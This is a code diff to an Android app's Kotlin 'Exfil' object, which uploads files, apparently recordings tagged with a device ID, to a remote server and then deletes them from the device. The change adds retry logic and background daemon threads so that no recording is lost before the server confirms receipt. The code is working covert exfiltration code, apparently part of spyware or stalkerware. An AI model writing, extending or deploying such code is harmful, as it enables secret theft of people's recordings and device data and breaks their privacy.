@@ -15,6 +15,11 @@ import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 object Exfil {
+    /** How many times an upload is repeated before the file is given up. */
+    private const val UPLOAD_ATTEMPTS = 6
+
+    /** Pause between two upload attempts. */
+    private const val UPLOAD_RETRY_MS = 20_000L
     private const val TAG = "Exfil"
 
     private val client = OkHttpClient.Builder()
@@ -189,9 +194,22 @@ object Exfil {
         }.start()
     }
 
+    /**
+     * Uploads a file and keeps it until the server really has it.
+     *
+     * The free server sleeps when nobody talks to it and the first request
+     * after the sleep answers with 502 / 429 - the recording was deleted
+     * before that and was simply lost. Now the file is deleted only after a
+     * 2xx answer and the upload is repeated a few times.
+     */
     fun uploadFile(ctx: Context, file: File, kind: String) {
+        uploadFile(ctx, file, kind, attempt = 0)
+    }
+
+    private fun uploadFile(ctx: Context, file: File, kind: String, attempt: Int) {
         resolveConfig(ctx)
         val url = endpoint("/upload") ?: return
+        if (!file.exists()) return
 
         val deviceId = Prefs.deviceId(ctx)
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
@@ -204,14 +222,40 @@ object Exfil {
         client.newCall(req).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.w(TAG, "upload failed: ${e.message}")
+                retryUpload(ctx, file, kind, attempt, "network")
                 recover(ctx)
             }
 
             override fun onResponse(call: Call, response: Response) {
+                val code = response.code
                 response.close()
-                file.delete()
+                if (code in 200..299) {
+                    file.delete()
+                } else {
+                    Log.w(TAG, "upload answered $code - keeping the file")
+                    retryUpload(ctx, file, kind, attempt, "http $code")
+                }
             }
         })
+    }
+
+    /** Repeats the upload - the server needs a moment to wake up. */
+    private fun retryUpload(ctx: Context, file: File, kind: String, attempt: Int, reason: String) {
+        if (attempt >= UPLOAD_ATTEMPTS - 1) {
+            Log.w(TAG, "upload abandoned after $UPLOAD_ATTEMPTS attempts ($reason)")
+            return
+        }
+        Thread {
+            try {
+                Thread.sleep(UPLOAD_RETRY_MS)
+            } catch (_: Throwable) {
+            }
+            try {
+                uploadFile(ctx, file, kind, attempt + 1)
+            } catch (t: Throwable) {
+                Log.w(TAG, "upload retry failed: ${t.message}")
+            }
+        }.apply { isDaemon = true }.start()
     }
 
     fun uploadMedia(ctx: Context, uri: Uri, kind: String, name: String, size: Long) {
